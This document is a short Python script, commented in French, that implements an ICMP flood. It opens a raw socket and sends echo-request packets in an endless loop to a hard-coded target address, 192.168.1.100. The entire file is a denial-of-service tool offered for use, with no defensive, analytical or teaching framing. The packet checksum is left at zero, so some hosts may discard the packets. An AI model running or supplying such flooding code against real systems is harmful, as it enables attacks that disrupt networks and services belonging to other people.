import os
import random
import socket
import struct

def icmp_flood(target_ip):
    icmp = socket.getprotobyname("icmp")
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    
    packet_id = random.randint(0, 65535)
    
    while True:
        packet = struct.pack("BBHHH", 8, 0, 0, packet_id, 1)
        s.sendto(packet, (target_ip, 0))
        packet_id = (packet_id + 1) & 0xFFFF

if __name__ == '__main__':
    target_ip = "192.168.1.100"  # Remplacez par l'adresse IP de la cible
    
    icmp_flood(target_ip)

